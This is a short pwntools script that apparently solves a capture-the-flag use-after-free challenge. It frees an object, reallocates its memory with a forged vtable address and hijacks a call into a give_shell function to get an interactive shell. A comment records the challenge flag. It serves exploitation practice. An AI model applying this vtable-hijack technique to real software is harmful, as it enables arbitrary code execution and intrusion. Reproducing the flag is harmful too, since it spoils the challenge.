from pwn import *
import sys

# p = process(sys.argv[1])

# m = 0x0000000000614ee0
# w = 0x0000000000614f30
# what we want to jump to 0x0040117a => Human::give_shell()
# to do that, we need to where m or w points to be 0x00401588

# with open('input.txt', 'wb') as f:
#     f.write(p64(0x00401588))


# p = process(argv=['./uaf', '16', 'input.txt'])
# p = process(argv=['./uaf', '16', '/proc/self/fd/0'])

p = process(argv=[sys.argv[1], '16', '/proc/self/fd/0'])
print(p.recv())
p.sendline(b'1')
print(p.recv())

p.sendline(b'3')
print(p.recv())

payload = p64(0x00401588)

p.sendline(b'2')
p.sendline(payload)
print(p.recvuntil(b'3. free\n'))
p.sendline(b'2')
p.sendline(payload)
print(p.recvuntil(b'3. free\n'))

p.sendline(b'1')
# print(p.recv())
p.interactive()




# flag: yay_f1ag_aft3r_pwning

